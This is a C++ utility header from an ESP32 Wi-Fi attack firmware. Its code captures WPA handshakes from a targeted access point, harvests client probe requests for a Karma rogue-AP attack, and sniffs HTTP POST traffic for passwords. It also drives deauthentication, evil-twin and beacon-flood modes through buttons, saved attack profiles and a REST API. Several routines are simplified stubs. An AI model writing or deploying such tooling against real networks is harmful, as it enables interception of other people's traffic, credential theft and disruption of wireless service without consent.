/*
 * ESP32 Ultimate Framework - Utility Functions
 * Helper functions for packet processing, hardware, and utilities
 */

#ifndef UTILITY_FUNCTIONS_H
#define UTILITY_FUNCTIONS_H

// ═══════════════════════════════════════════════════════════════
// PACKET PROCESSING
// ═══════════════════════════════════════════════════════════════

void packetSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA)
    return;

  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
  const uint8_t *frame = pkt->payload;
  const uint16_t frameLen = ctrl.sig_len;

  if (frameLen < 24) return; // Minimum frame size

  uint8_t frameType = frame[0];
  uint8_t frameSubType = frame[0] & 0xF0;

  // Beacon frames (0x80)
  if (frameType == 0x80) {
    processBeacon(frame, frameLen);
  }
  // Probe request (0x40)
  else if (frameType == 0x40) {
    processProbeRequest(frame, frameLen);
  }
  // Data frames (0x08, 0x88)
  else if ((frameType & 0x0C) == 0x08) {
    processDataPacket(frame, frameLen);

    // Check for handshake
    if (currentMode == MODE_HANDSHAKE_CAPTURE) {
      processHandshake(frame, frameLen);
    }
  }
}

void processBeacon(const uint8_t* packet, int length) {
  if (length < 38) return;

  // Extract BSSID
  uint8_t bssid[6];
  memcpy(bssid, &packet[10], 6);
  String bssidStr = macToString(bssid);

  // Extract channel (from radiotap or rx_ctrl)
  // Simplified - would need proper parsing

  // Extract SSID
  int ssidLen = packet[37];
  if (ssidLen > 32 || ssidLen < 0 || (37 + ssidLen) > length) return;

  String ssid = "";
  for (int i = 0; i < ssidLen; i++) {
    ssid += (char)packet[38 + i];
  }

  // Update network list
  bool found = false;
  for (auto& net : networks) {
    if (net.bssid == bssidStr) {
      net.beaconCount++;
      net.lastSeen = millis();
      found = true;
      break;
    }
  }

  if (!found && networks.size() < MAX_NETWORKS) {
    NetworkInfo net;
    net.ssid = ssid.length() > 0 ? ssid : "(Hidden)";
    net.bssid = bssidStr;
    memcpy(net.bssid_bytes, bssid, 6);
    net.hidden = (ssid.length() == 0);
    net.beaconCount = 1;
    net.lastSeen = millis();
    networks.push_back(net);
  }
}

void processProbeRequest(const uint8_t* packet, int length) {
  if (length < 26) return;

  // Extract client MAC (source address)
  uint8_t clientMAC[6];
  memcpy(clientMAC, &packet[10], 6);
  String clientMACStr = macToString(clientMAC);

  // Extract SSID from probe request
  if (length < 27) return;

  int ssidLen = packet[25];
  if (ssidLen > 32 || ssidLen < 0 || (26 + ssidLen) > length) return;

  String ssid = "";
  for (int i = 0; i < ssidLen; i++) {
    ssid += (char)packet[26 + i];
  }

  // Store probe request
  if (currentMode == MODE_PROBE_SNIFF || currentMode == MODE_KARMA_ATTACK) {
    if (probeRequests.size() < 200) { // Limit storage
      ProbeRequest probe;
      probe.client_mac = clientMACStr;
      probe.ssid = ssid;
      probe.rssi = -50; // Would get from packet metadata
      probe.timestamp = millis();
      probeRequests.push_back(probe);
      stats.probesCollected++;

      Serial.printf("[PROBE] %s → %s\n", clientMACStr.c_str(), ssid.c_str());
    }

    // Add to Karma SSID list if unique
    if (currentMode == MODE_KARMA_ATTACK && ssid.length() > 0) {
      bool exists = false;
      for (const auto& ks : karmaSSIDs) {
        if (ks == ssid) {
          exists = true;
          break;
        }
      }
      if (!exists) {
        karmaSSIDs.push_back(ssid);
        Serial.println("[KARMA] New SSID: " + ssid);
      }
    }
  }
}

void processHandshake(const uint8_t* packet, int length) {
  // Simplified handshake detection
  // Full implementation would parse EAPOL frames

  if (length < 100) return;

  // Check if this is an EAPOL packet (key exchange)
  // EAPOL packets have LLC header: 0xAA 0xAA 0x03 0x00 0x00 0x00 0x88 0x8E

  bool isEAPOL = false;
  for (int i = 24; i < length - 8; i++) {
    if (packet[i] == 0x88 && packet[i+1] == 0x8E) {
      isEAPOL = true;
      break;
    }
  }

  if (!isEAPOL) return;

  // Extract BSSID
  uint8_t bssid[6];
  memcpy(bssid, &packet[10], 6);
  String bssidStr = macToString(bssid);

  // Check if this is for our target
  if (targetBSSID.length() > 0 && bssidStr != targetBSSID) {
    return;
  }

  Serial.println("[HANDSHAKE] EAPOL frame detected from " + bssidStr);

  // Find or create handshake entry
  HandshakeData* hs = nullptr;
  for (auto& h : handshakes) {
    if (h.bssid == bssidStr) {
      hs = &h;
      break;
    }
  }

  if (hs == nullptr && handshakes.size() < 50) {
    HandshakeData newHS;
    newHS.bssid = bssidStr;
    newHS.ssid = targetSSID;
    newHS.length = 0;
    newHS.messages_captured = 0;
    newHS.complete = false;
    newHS.timestamp = millis();
    handshakes.push_back(newHS);
    hs = &handshakes.back();
  }

  if (hs != nullptr) {
    // Store packet data (simplified)
    if (hs->length + length < 512) {
      memcpy(&hs->data[hs->length], packet, length);
      hs->length += length;
      hs->messages_captured++;

      // Check if handshake is complete (need all 4 messages)
      if (hs->messages_captured >= 4) {
        hs->complete = true;
        stats.handshakesCaptured++;

        Serial.println("\n╔════════════════════════════════════╗");
        Serial.println("║  ✅ COMPLETE HANDSHAKE!           ║");
        Serial.println("╚════════════════════════════════════╝");
        Serial.println("[+] BSSID: " + bssidStr);
        Serial.println("[+] Messages: 4/4");
      }
    }
  }
}

void processDataPacket(const uint8_t* packet, int length) {
  if (currentMode != MODE_TRAFFIC_SNIFF && currentMode != MODE_HTTP_SNIFF &&
      currentMode != MODE_MITM) {
    return;
  }

  if (length < 50) return;

  // Extract MAC addresses
  uint8_t srcMAC[6], dstMAC[6];
  memcpy(srcMAC, &packet[10], 6);
  memcpy(dstMAC, &packet[4], 6);

  String srcMACStr = macToString(srcMAC);
  String dstMACStr = macToString(dstMAC);

  // Store traffic (simplified - would need full IP/TCP parsing)
  if (traffic.size() < MAX_TRAFFIC_LOGS) {
    TrafficCapture tc;
    tc.src_mac = srcMACStr;
    tc.dst_mac = dstMACStr;
    tc.src_ip = "0.0.0.0"; // Would extract from packet
    tc.dst_ip = "0.0.0.0";
    tc.protocol = "DATA";
    tc.src_port = 0;
    tc.dst_port = 0;
    tc.length = length;
    tc.timestamp = millis();

    // Extract payload snippet
    tc.payload = "";
    for (int i = 24; i < min(length, 74); i++) {
      if (isprint(packet[i])) {
        tc.payload += (char)packet[i];
      }
    }

    traffic.push_back(tc);
  }

  // HTTP credential detection (simplified)
  if (currentMode == MODE_HTTP_SNIFF || currentMode == MODE_MITM) {
    // Look for HTTP POST with credentials
    String payloadStr = "";
    for (int i = 24; i < min(length, 200); i++) {
      payloadStr += (char)packet[i];
    }

    if (payloadStr.indexOf("POST") >= 0) {
      if (payloadStr.indexOf("password") >= 0 || payloadStr.indexOf("passwd") >= 0) {
        Serial.println("\n[HTTP] Potential credential in POST detected!");

        HTTPCredential cred;
        cred.url = "http://unknown";
        cred.username = "unknown";
        cred.password = "detected";
        cred.ip = "0.0.0.0";
        cred.timestamp = millis();

        if (httpCredentials.size() < 100) {
          httpCredentials.push_back(cred);
        }
      }
    }
  }
}

// ═══════════════════════════════════════════════════════════════
// UTILITY FUNCTIONS
// ═══════════════════════════════════════════════════════════════

void generateRandomMAC(uint8_t* mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = random(0, 256);
  }
  // Set locally administered bit
  mac[0] |= 0x02;
  // Clear multicast bit
  mac[0] &= 0xFE;
}

String macToString(const uint8_t* mac) {
  char buf[18];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

void stringToMAC(String macStr, uint8_t* mac) {
  sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

String getManufacturer(const uint8_t* mac) {
  // OUI lookup (simplified - first 3 bytes)
  uint32_t oui = (mac[0] << 16) | (mac[1] << 8) | mac[2];

  // Common OUIs
  switch(oui) {
    case 0x001122: return "CIMSYS Inc";
    case 0x00E04C: return "Realtek";
    case 0x0050F2: return "Microsoft";
    case 0x000C29: return "VMware";
    case 0xB827EB: return "Raspberry Pi";
    case 0x00A0C9: return "Intel";
    case 0x00B0D0: return "Dell";
    default: return "Unknown";
  }
}

String guessOS(const uint8_t* packet) {
  // Simplified OS fingerprinting
  // Would analyze TTL, window size, etc.
  return "Unknown";
}

String getEncryptionType(uint8_t encryption) {
  switch(encryption) {
    case WIFI_AUTH_OPEN: return "Open";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA-PSK";
    case WIFI_AUTH_WPA2_PSK: return "WPA2-PSK";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2-PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-Enterprise";
    case WIFI_AUTH_WPA3_PSK: return "WPA3-PSK";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3-PSK";
    default: return "Unknown";
  }
}

String formatBytes(uint32_t bytes) {
  if (bytes < 1024) return String(bytes) + " B";
  else if (bytes < 1024 * 1024) return String(bytes / 1024) + " KB";
  else return String(bytes / (1024 * 1024)) + " MB";
}

String formatDuration(unsigned long ms) {
  unsigned long seconds = ms / 1000;
  unsigned long minutes = seconds / 60;
  unsigned long hours = minutes / 60;

  if (hours > 0) {
    return String(hours) + "h " + String(minutes % 60) + "m";
  } else if (minutes > 0) {
    return String(minutes) + "m " + String(seconds % 60) + "s";
  } else {
    return String(seconds) + "s";
  }
}

// ═══════════════════════════════════════════════════════════════
// HARDWARE FUNCTIONS
// ═══════════════════════════════════════════════════════════════

void updateDisplay() {
  #ifdef FEATURE_OLED
    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(0, 0);

    // Title
    display.setTextSize(1);
    display.println("ESP32 FRAMEWORK");
    display.drawLine(0, 10, 128, 10, SSD1306_WHITE);

    // Status
    display.setTextSize(1);
    display.setCursor(0, 15);

    String modeStr = "";
    switch(currentMode) {
      case MODE_IDLE: modeStr = "IDLE"; break;
      case MODE_AUTO_DEAUTH: modeStr = "DEAUTH"; break;
      case MODE_EVIL_TWIN: modeStr = "EVIL TWIN"; break;
      case MODE_BEACON_FLOOD: modeStr = "BEACON FLOOD"; break;
      case MODE_HANDSHAKE_CAPTURE: modeStr = "HANDSHAKE"; break;
      case MODE_AUTO_PILOT: modeStr = "AUTO-PILOT"; break;
      default: modeStr = "ACTIVE"; break;
    }

    display.print("Mode: ");
    display.println(modeStr);

    display.print("Status: ");
    display.println(attackRunning ? "RUNNING" : "Stopped");

    display.print("Networks: ");
    display.println(networks.size());

    display.print("Devices: ");
    display.println(devices.size());

    display.print("Creds: ");
    display.println(capturedCredentials.size());

    // Battery
    display.print("Battery: ");
    display.print(batteryPercent);
    display.println("%");

    // Uptime
    display.print("Up: ");
    display.println(formatDuration(millis()));

    display.display();
  #endif
}

void updateLEDs() {
  #ifdef FEATURE_LED_STATUS
    unsigned long now = millis();

    // Status LED pattern based on mode
    switch(currentLEDPattern) {
      case LED_OFF:
        digitalWrite(LED_STATUS_PIN, LOW);
        break;

      case LED_SOLID:
        digitalWrite(LED_STATUS_PIN, HIGH);
        break;

      case LED_SLOW_BLINK:
        if (now - lastLEDBlink > 1000) {
          ledState = !ledState;
          digitalWrite(LED_STATUS_PIN, ledState);
          lastLEDBlink = now;
        }
        break;

      case LED_FAST_BLINK:
        if (now - lastLEDBlink > 200) {
          ledState = !ledState;
          digitalWrite(LED_STATUS_PIN, ledState);
          lastLEDBlink = now;
        }
        break;

      case LED_PULSE:
        // PWM pulse effect (simplified)
        if (now - lastLEDBlink > 2000) {
          lastLEDBlink = now;
        }
        break;
    }

    // Attack LED
    if (attackRunning) {
      digitalWrite(LED_ATTACK_PIN, HIGH);
      currentLEDPattern = LED_FAST_BLINK;
    } else {
      digitalWrite(LED_ATTACK_PIN, LOW);
      currentLEDPattern = LED_SLOW_BLINK;
    }
  #endif
}

void checkButtons() {
  #ifdef FEATURE_BUTTON_CONTROL
    // Mode button (built-in BOOT button)
    if (digitalRead(BUTTON_MODE_PIN) == LOW) {
      if (!buttonPressed && (millis() - lastButtonPress) > 500) {
        buttonPressed = true;
        lastButtonPress = millis();

        Serial.println("\n[BUTTON] Mode button pressed");

        // Cycle through modes or toggle attack
        if (attackRunning) {
          attackRunning = false;
          currentMode = MODE_IDLE;
          Serial.println("[BUTTON] Attack stopped");

          #ifdef FEATURE_BUZZER
            playTone(800, 100);
          #endif
        } else {
          // Start default attack
          scanNetworks();
          currentMode = MODE_AUTO_DEAUTH;
          attackRunning = true;
          Serial.println("[BUTTON] Starting auto-deauth");

          #ifdef FEATURE_BUZZER
            playTone(1200, 100);
          #endif
        }
      }
    } else {
      buttonPressed = false;
    }

    // Action button
    if (digitalRead(BUTTON_ACTION_PIN) == LOW) {
      static bool actionPressed = false;
      if (!actionPressed) {
        actionPressed = true;

        Serial.println("\n[BUTTON] Action button pressed");

        // Quick scan
        scanNetworks();

        #ifdef FEATURE_BUZZER
          playTone(1000, 50);
        #endif
      }
    } else {
      static bool actionPressed = false;
      actionPressed = false;
    }
  #endif
}

void playTone(int frequency, int duration) {
  #ifdef FEATURE_BUZZER
    tone(BUZZER_PIN, frequency, duration);
    delay(duration);
    noTone(BUZZER_PIN);
  #endif
}

void updateBatteryStatus() {
  #ifdef FEATURE_BATTERY_MON
    // Read battery voltage from ADC
    int rawValue = analogRead(BATTERY_PIN);

    // Convert to voltage (assuming voltage divider)
    float voltage = (rawValue / 4095.0) * 3.3 * 2; // Adjust multiplier based on divider

    // Estimate percentage (3.0V = 0%, 4.2V = 100% for LiPo)
    batteryPercent = (int)((voltage - 3.0) / 1.2 * 100);

    if (batteryPercent < 0) batteryPercent = 0;
    if (batteryPercent > 100) batteryPercent = 100;

    if (batteryPercent < 20) {
      Serial.println("[!] WARNING: Low battery (" + String(batteryPercent) + "%)");

      #ifdef FEATURE_BUZZER
        playTone(500, 100);
      #endif
    }
  #else
    batteryPercent = 100; // Default if not monitoring
  #endif
}

// ═══════════════════════════════════════════════════════════════
// PROFILE MANAGEMENT
// ═══════════════════════════════════════════════════════════════

void saveProfile(String name) {
  AttackProfile profile;
  profile.name = name;
  profile.mode = currentMode;
  profile.targetSSID = targetSSID;
  profile.targetBSSID = targetBSSID;
  profile.duration = attackDuration / 1000;
  profile.autoNext = autoPilotEnabled;

  // Save parameters
  profile.params["deauth_packets"] = String(deauthPacketsPerAP);
  profile.params["deauth_delay"] = String(deauthDelay);
  profile.params["beacon_count"] = String(beaconFloodCount);
  profile.params["random_mac"] = String(randomMAC);

  profiles.push_back(profile);

  Serial.println("[+] Profile saved: " + name);
}

void loadProfile(String name) {
  for (auto& profile : profiles) {
    if (profile.name == name) {
      currentMode = profile.mode;
      targetSSID = profile.targetSSID;
      targetBSSID = profile.targetBSSID;
      attackDuration = profile.duration * 1000;
      autoPilotEnabled = profile.autoNext;

      // Load parameters
      if (profile.params.find("deauth_packets") != profile.params.end()) {
        deauthPacketsPerAP = profile.params["deauth_packets"].toInt();
      }
      if (profile.params.find("deauth_delay") != profile.params.end()) {
        deauthDelay = profile.params["deauth_delay"].toInt();
      }

      Serial.println("[+] Profile loaded: " + name);
      return;
    }
  }

  Serial.println("[-] Profile not found: " + name);
}

void deleteProfile(String name) {
  for (size_t i = 0; i < profiles.size(); i++) {
    if (profiles[i].name == name) {
      profiles.erase(profiles.begin() + i);
      Serial.println("[+] Profile deleted: " + name);
      return;
    }
  }
}

void handleProfiles() {
  if (server.method() == HTTP_POST) {
    String action = server.arg("action");
    String name = server.arg("name");

    if (action == "save") {
      saveProfile(name);
      server.send(200, "application/json", "{\"message\":\"Profile saved\"}");
    } else if (action == "load") {
      loadProfile(name);
      server.send(200, "application/json", "{\"message\":\"Profile loaded\"}");
    } else if (action == "delete") {
      deleteProfile(name);
      server.send(200, "application/json", "{\"message\":\"Profile deleted\"}");
    }
    return;
  }

  // List profiles
  String json = "{\"profiles\":[";
  for (size_t i = 0; i < profiles.size(); i++) {
    if (i > 0) json += ",";
    json += "{\"name\":\"" + profiles[i].name + "\"}";
  }
  json += "]}";

  server.send(200, "application/json", json);
}

void handleSettings() {
  if (server.method() == HTTP_POST) {
    // Save settings
    if (server.hasArg("deauth_packets")) {
      deauthPacketsPerAP = server.arg("deauth_packets").toInt();
    }
    if (server.hasArg("deauth_delay")) {
      deauthDelay = server.arg("deauth_delay").toInt();
    }
    if (server.hasArg("beacon_count")) {
      beaconFloodCount = server.arg("beacon_count").toInt();
    }
    if (server.hasArg("random_mac")) {
      randomMAC = server.arg("random_mac") == "true";
    }

    saveSettings();

    server.send(200, "application/json", "{\"message\":\"Settings saved\"}");
    return;
  }

  // Get settings
  String json = "{";
  json += "\"deauth_packets\":" + String(deauthPacketsPerAP) + ",";
  json += "\"deauth_delay\":" + String(deauthDelay) + ",";
  json += "\"beacon_count\":" + String(beaconFloodCount) + ",";
  json += "\"random_mac\":" + String(randomMAC ? "true" : "false");
  json += "}";

  server.send(200, "application/json", json);
}

void handleAPI() {
  // REST API endpoint for external control
  String command = server.arg("cmd");

  if (command == "scan") {
    scanNetworks();
    server.send(200, "application/json", "{\"status\":\"scanning\"}");
  }
  else if (command == "stop") {
    attackRunning = false;
    currentMode = MODE_IDLE;
    server.send(200, "application/json", "{\"status\":\"stopped\"}");
  }
  else if (command == "stats") {
    String json = "{";
    json += "\"networks\":" + String(stats.networksScanned) + ",";
    json += "\"devices\":" + String(stats.devicesDiscovered) + ",";
    json += "\"credentials\":" + String(stats.credentialsCaptured) + ",";
    json += "\"handshakes\":" + String(stats.handshakesCaptured) + ",";
    json += "\"probes\":" + String(stats.probesCollected) + ",";
    json += "\"attacks\":" + String(stats.attacksExecuted) + ",";
    json += "\"uptime\":\"" + formatDuration(millis()) + "\"";
    json += "}";
    server.send(200, "application/json", json);
  }
  else {
    server.send(400, "application/json", "{\"error\":\"Unknown command\"}");
  }
}

#endif // UTILITY_FUNCTIONS_H
